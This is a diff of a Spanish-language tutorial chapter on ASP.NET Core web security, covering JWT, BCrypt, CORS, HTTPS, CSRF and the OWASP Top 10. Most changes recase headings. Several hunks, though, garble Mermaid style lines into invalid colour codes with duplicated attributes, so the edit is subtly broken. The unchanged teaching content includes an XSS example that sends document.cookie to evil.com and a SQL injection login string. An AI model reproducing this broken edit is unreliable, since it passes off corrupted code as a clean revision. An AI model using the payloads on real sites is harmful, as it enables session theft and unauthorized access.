@@ -1,18 +1,18 @@
-- [24. Seguridad en Aplicaciones Web](#24-seguridad-en-aplicaciones-web)
-  - [24.1. Autenticación: ¿Quién Eres?](#241-autenticación-quién-eres)
-  - [24.2. Autorización: ¿Qué Puedes Hacer?](#242-autorización-qué-puedes-hacer)
-  - [24.3. JWT: Estructura y Flujo](#243-jwt-estructura-y-flujo)
-  - [24.4. Refresh Token: Renovar JWT](#244-refresh-token-renovar-jwt)
-  - [24.5. Hashing de Contraseñas: BCrypt](#245-hashing-de-contraseñas-bcrypt)
-  - [24.6. CORS: Orígenes Permitidos](#246-cors-orígenes-permitidos)
-  - [24.7. HTTPS: Comunicación Segura](#247-https-comunicación-segura)
-  - [24.8. Security Headers](#248-security-headers)
-  - [24.9. CSRF: Cross-Site Request Forgery](#249-csrf-cross-site-request-forgery)
-  - [24.10. OWASP Top 10](#2410-owasp-top-10)
-  - [24.11. Buenas Prácticas](#2411-buenas-prácticas)
+- [24. Seguridad en aplicaciones web](#24-seguridad-en-aplicaciones-web)
+  - [24.1. Autenticación: ¿quién eres?](#241-autenticación-quién-eres)
+  - [24.2. Autorización: ¿qué puedes hacer?](#242-autorización-qué-puedes-hacer)
+  - [24.3. JWT: estructura y flujo](#243-jwt-estructura-y-flujo)
+  - [24.4. Refresh token: renovar JWT](#244-refresh-token-renovar-jwt)
+  - [24.5. Hashing de contraseñas: BCrypt](#245-hashing-de-contraseñas-bcrypt)
+  - [24.6. CORS: orígenes permitidos](#246-cors-orígenes-permitidos)
+  - [24.7. HTTPS: comunicación segura](#247-https-comunicación-segura)
+  - [24.8. Security headers](#248-security-headers)
+  - [24.9. CSRF: Cross-Site request forgery](#249-csrf-cross-site-request-forgery)
+  - [24.10. OWASP top 10](#2410-owasp-top-10)
+  - [24.11. Buenas prácticas](#2411-buenas-prácticas)
 
 
-# 24. Seguridad en Aplicaciones Web
+# 24. Seguridad en aplicaciones web
 
 > 💡 **Punto de partida:** Tu app funciona, pero... ¿es segura? ¿Alguien puede adivinar las contraseñas? ¿Puede un atacante enviar código malicioso en un formulario? ¿Qué pasa si interceptan las peticiones? La seguridad no es un "extra": es un requisito fundamental. Vamos a ver las principales amenazas y cómo proteger nuestra aplicación con autenticación, autorización, JWT, hashing, CORS y HTTPS.
 
@@ -27,7 +27,7 @@ En este tema profundizarás en seguridad web: autenticación vs autorización, J
 - Entender HTTPS y los certificados SSL/TLS
 - Conocer el OWASP Top 10 y las principales amenazas
 
-## 24.1. Autenticación: ¿Quién Eres?
+## 24.1. Autenticación: ¿quién eres?
 
 La **autenticación** verifica la identidad de un usuario. "¿Quién eres?"
 
@@ -97,11 +97,11 @@ app.MapGet("/api/datos-privados", () =>
 
 > 📝 **Nota:** `UseAuthentication()` debe ir **antes** de `UseAuthorization()` en el pipeline de middleware. Si los pones al revés, la autorización no funcionará porque no sabe quién es el usuario.
 
-## 24.2. Autorización: ¿Qué Puedes Hacer?
+## 24.2. Autorización: ¿qué puedes hacer?
 
 La **autorización** determina qué puede hacer un usuario una vez autenticado. "¿Qué permisos tienes?"
 
-### RBAC: Role-Based Access Control
+### RBAC: Role-Based access control
 
 ```csharp
 // Configurar políticas de autorización
@@ -154,7 +154,7 @@ app.MapGet("/api/perfil/{nombre}", (string nombre, ClaimsPrincipal user) =>
 
 > ⚠️ **Advertencia:** La autorización **no sustituye** a la autenticación. Siempre primero autenticas (`UseAuthentication`), luego autorizas (`UseAuthorization`). Un usuario no autenticado no tiene claims que comprobar.
 
-## 24.3. JWT: Estructura y Flujo
+## 24.3. JWT: estructura y flujo
 
 Un **JWT** (JSON Web Token) es un token firmado que contiene datos del usuario. Tiene tres partes: `HEADER.PAYLOAD.SIGNATURE`.
 
@@ -168,10 +168,10 @@ graph LR
     P --> J
     S --> J
 
-    style H fill:#2196F3,color:#fff
-    style P fill:#4CAF50,color:#fff
-    style S fill:#f44336,color:#fff
-    style J fill:#9C27B0,color:#fff
+    style H fill:#2196F,color:#fff3,color:#fff
+    style P fill:#4CAF5,color:#fff0,color:#fff
+    style S fill:#f4433,color:#fff6,color:#fff
+    style J fill:#9C27B,color:#fff0,color:#fff
 ```
 
 | Parte | Contenido | Ejemplo |
@@ -239,7 +239,7 @@ public string GenerarToken(int userId, string email, string role)
 
 📌 **Ejemplo real:** Cuando haces login en Spotify, el servidor genera un JWT con tu ID y tipo de cuenta (free/premium). Cada vez que Spotify reproduce una canción, envía ese JWT para verificar que tienes derecho a escucharla.
 
-## 24.4. Refresh Token: Renovar JWT
+## 24.4. Refresh token: renovar JWT
 
 Un **Access Token** dura poco (15-30 minutos). Un **Refresh Token** dura días o semanas y permite obtener un nuevo Access Token sin pedir login de nuevo.
 
@@ -309,7 +309,7 @@ public async Task<IActionResult> Refresh([FromBody] RefreshRequest request)
 | **Seguridad** | ⚠️ Robo de token = acceso completo | ✅ Cookie con HttpOnly/Secure |
 | **Uso típico** | APIs REST, SPA, móviles | Web apps tradicionales, SSR |
 
-## 24.5. Hashing de Contraseñas: BCrypt
+## 24.5. Hashing de contraseñas: BCrypt
 
 **NUNCA** almacenes contraseñas en texto plano. Usa **hashing** con un algoritmo seguro como **BCrypt**.
 
@@ -393,7 +393,7 @@ public class AuthService(IPersonaRepository repository, PasswordService password
 
 📌 **Ejemplo real:** Cuando Instagram guarda tu contraseña, la hashea con BCrypt. Cuando haces login, hashea la contraseña que introduces y la compara con el hash almacenado. Si coinciden, ¡accesas! Si no, "credenciales incorrectas".
 
-## 24.6. CORS: Orígenes Permitidos
+## 24.6. CORS: orígenes permitidos
 
 **CORS** (Cross-Origin Resource Sharing) controla qué dominios pueden acceder a tu API desde el navegador. Sin estas cabeceras, un script malicioso en `evil.com` no podría leer la respuesta de `tudominio.com` (aunque el navegador sí llega a enviar la petición simple).
 
@@ -452,7 +452,7 @@ builder.Services.AddCors(options =>
 | `Access-Control-Allow-Credentials` | Permitir cookies |
 | `Access-Control-Max-Age` | Tiempo de caché del preflight |
 
-## 24.7. HTTPS: Comunicación Segura
+## 24.7. HTTPS: comunicación segura
 
 **HTTPS** es HTTP con cifrado SSL/TLS. La "S" significa **Secure**.
 
@@ -464,8 +464,8 @@ graph LR
     C -->|"4. Usemos esta clave"| S
     S -->|"5. 🔒 Datos cifrados"| C
 
-    style C fill:#2196F3,color:#fff
-    style S fill:#4CAF50,color:#fff
+    style C fill:#2196F,color:#fff3,color:#fff
+    style S fill:#4CAF5,color:#fff0,color:#fff
 ```
 
 | HTTP | HTTPS |
@@ -494,7 +494,7 @@ app.UseHttpsRedirection();
 
 > 💡 **Consejo:** Para desarrollo local, usa `dotnet dev-certs https` para generar un certificado autofirmado. En producción, usa Let's Encrypt (gratuito) o un certificado comercial.
 
-## 24.8. Security Headers
+## 24.8. Security headers
 
 Las **Security Headers** son cabeceras HTTP que protegen tu app de ataques comunes. Configúralas en ASP.NET Core:
 
@@ -507,7 +507,7 @@ graph TB
         H4 --> H5["Content-Security-Policy<br/>default-src 'self'"]
     end
 
-    style HEADERS fill:#4CAF50,color:#fff
+    style HEADERS fill:#4CAF5,color:#fff0,color:#fff
 ```
 
 | Cabecera | Protege contra | Valor recomendado |
@@ -540,7 +540,7 @@ app.Use(async (context, next) =>
 
 > 💡 **Consejo:** Usa la librería `NWebsec` o `AspNetCoreRateLimit` para configurar headers de forma declarativa en vez de manual.
 
-## 24.9. CSRF: Cross-Site Request Forgery
+## 24.9. CSRF: Cross-Site request forgery
 
 El **CSRF** es un ataque donde un sitio malicioso hace peticiones a tu app usando las credenciales del usuario (cookies) sin su consentimiento.
 
@@ -558,7 +558,7 @@ sequenceDiagram
     Note over U: Usuario no se enteró
 ```
 
-### Prevención con Anti-Forgery Tokens
+### Prevención con Anti-Forgery tokens
 
 ```csharp
 // Program.cs: Habilitar anti-forgery
@@ -589,7 +589,7 @@ public IActionResult Transferir([FromBody] TransferenciaRequest request)
 
 > 💡 **Consejo:** Para APIs SPA, usa tokens CSRF en cabeceras (no cookies). El interceptor de Angular, React o Vue envía el token en cada petición POST/PUT/DELETE.
 
-### Tabla comparativa: CSRF vs XSS vs SQL Injection
+### Tabla comparativa: CSRF vs XSS vs SQL injection
 
 | Amenaza | Qué hace | Ejemplo | Prevención |
 |---------|----------|---------|------------|
@@ -597,7 +597,7 @@ public IActionResult Transferir([FromBody] TransferenciaRequest request)
 | **XSS** | Inyecta JavaScript | `<script>document.location='evil.com?c='+document.cookie` | Sanitización + CSP |
 | **SQL Injection** | Inyecta SQL | `' OR '1'='1` en un campo de login | Parámetros SQL |
 
-## 24.10. OWASP Top 10
+## 24.10. OWASP top 10
 
 El **OWASP Top 10** es la lista de las 10 vulnerabilidades de seguridad más comunes en aplicaciones web.
 
@@ -647,7 +647,7 @@ builder.Services.AddRateLimiter(options =>
 
 > 💡 **Consejo:** Para el examen, recuerda los 3 pilares de la seguridad web: **Confidencialidad** (solo los autorizados ven los datos), **Integridad** (los datos no se modifican), **Disponibilidad** (el servicio está accesible). Y la regla de oro: **NUNCA confíes en el cliente**.
 
-## 24.11. Buenas Prácticas
+## 24.11. Buenas prácticas
 
 - **JWT con Refresh Token**: Access Token corto (15 min), Refresh Token largo (7 días)
 - **NUNCA contraseñas en texto plano**: BCrypt o Argon2 siempre
